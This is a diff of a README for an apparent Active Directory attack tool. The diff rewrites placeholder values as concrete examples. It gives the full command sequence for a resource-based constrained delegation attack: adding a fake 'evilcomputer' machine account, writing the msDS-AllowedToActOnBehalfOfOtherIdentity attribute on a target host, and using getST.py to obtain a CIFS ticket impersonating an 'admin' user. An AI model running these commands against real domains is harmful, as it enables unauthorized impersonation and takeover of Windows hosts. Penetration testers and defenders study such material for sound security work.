@@ -56,23 +56,24 @@ This implementation uses pure [Impacket](https://github.com/SecureAuthCorp/impac
 
 ### Creating the fake computer
 
-Using addcomputer.py example from Impacket let's create a fake computer:
+Using addcomputer.py example from Impacket let's create a fake computer (called `evilcomputer`):
 
 ```
-addcomputer.py -computer-name 'FAKE_COMPUTER$' -computer-pass SuperS3cr3tP@ss -dc-ip 10.13.37.1 domain.local/user:userpass
+addcomputer.py -computer-name 'evilcomputer$' -computer-pass ev1lP@sS -dc-ip 192.168.33.203 ecorp.local/test:ohW9Lie0
 ```
 
 ### Modifying delegation rights
 
 Implemented the script [rbcd.py](./rbcd.py) found here in the repo which
-adds the related security descriptor for the newly created FAKE_COMPUTER to the
+adds the related security descriptor of the newly created EVILCOMPUTER to the
 `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target computer.
 
 ```
-rbcd.py
+./rbcd.py -f EVILCOMPUTER -t WEB -dc-ip 192.168.33.203 ecorp\\test:ohW9Lie0
 ```
 
 The script uses heavily the Python classes in the `ntlmrelayx.py` Impacket example.
+For help and an example call the script without options.
 
 ### Getting the impersonated service ticket
 
@@ -81,17 +82,17 @@ S4U2Self query and get an impersonated Service Ticket for the
 target computer. With `getST.py` Impacket example script:
 
 ```
-getST.py -spn cifs/TARGET_COMPUTER_NAME.domain -impersonate TARGET_DOMAIN_USER -dc-ip 10.13.37.1 DOMAIN/FAKE_COMPUTER:SuperS3cr3tP@ss
+getST.py -spn cifs/WEB.ecorp.local -impersonate admin -dc-ip 192.168.33.203 ecorp.local/EVILCOMPUTER$:ev1lP@sS
 ```
 
-The above command fetches a CIFS Service Ticket on behalf of TARGET_DOMAIN_USER
-and stores it in the file TARGET_DOMAIN_USER.ccache.
+The above command fetches a CIFS Service Ticket on behalf of the targetted domain user `admin`
+and stores it in the file `admin.ccache`.
 
 After adding the file path to the KRB5CCNAME variable the ticket is usable for
 Kerberos clients.
 
 ```
-export KRB5CCNAME=`pwd`/TARGET_DOMAIN_USER.ccache
+export KRB5CCNAME=`pwd`/admin.ccache
 klist
 ```
 
